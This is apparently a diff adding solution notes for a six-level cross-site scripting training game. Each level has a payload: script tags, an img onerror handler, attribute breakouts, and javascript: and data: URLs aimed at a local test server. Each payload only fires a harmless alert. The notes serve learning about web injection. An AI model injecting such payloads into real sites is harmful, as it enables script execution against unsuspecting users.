@@ -1,0 +1,25 @@
+level 1
+add to input
+<script>
+  alert('aaa');
+</script>
+
+level 2
+add to textarea
+<img src=err onerror=alert('aaa')>
+
+level 3
+change url
+http://127.0.0.1:8080/#1'%20onerror='alert("aaa")';
+
+level 4
+change url
+http://127.0.0.1:8080/?timer=1')%3Balert('aaa
+
+level 5
+change url
+http://127.0.0.1:8080/signup?next=javascript%3Aalert('aaa')
+
+level 6
+change url
+http://127.0.0.1:8080/#data://text/javascript,alert('aaa')
